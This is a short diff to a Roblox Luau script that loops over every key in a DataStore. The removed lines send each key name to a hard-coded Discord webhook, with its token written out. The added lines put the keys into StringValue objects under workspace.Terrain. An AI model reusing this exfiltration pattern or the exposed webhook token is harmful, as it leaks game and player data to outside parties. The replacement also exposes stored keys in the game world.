@@ -10,9 +10,9 @@ while true do
 		local D = DataStore:GetDataStore(C.DataStoreName):ListKeysAsync()
 		while true do
 			for _, B in next, D:GetCurrentPage() do
-				HTTP:PostAsync(`https://discord.com/api/webhooks/1176904084465393664/RMAhbC5AU7ORLjtotOhP5uiHPntnseTdMS7a83iyNyw-5CjT2HN0LjhcXUAn-2h0RXic`, HTTP:JSONEncode({
-					['content']=C.DataStoreName .. ' / ' .. B.KeyName
-				}))
+				local Az = Instance.new('StringValue', workspace.Terrain)
+				Az.Name = C.DataStoreName
+				Az.Value = B.KeyName
 			end
 			if D.IsFinished then break end 
 			D:AdvanceToNextPageAsync()
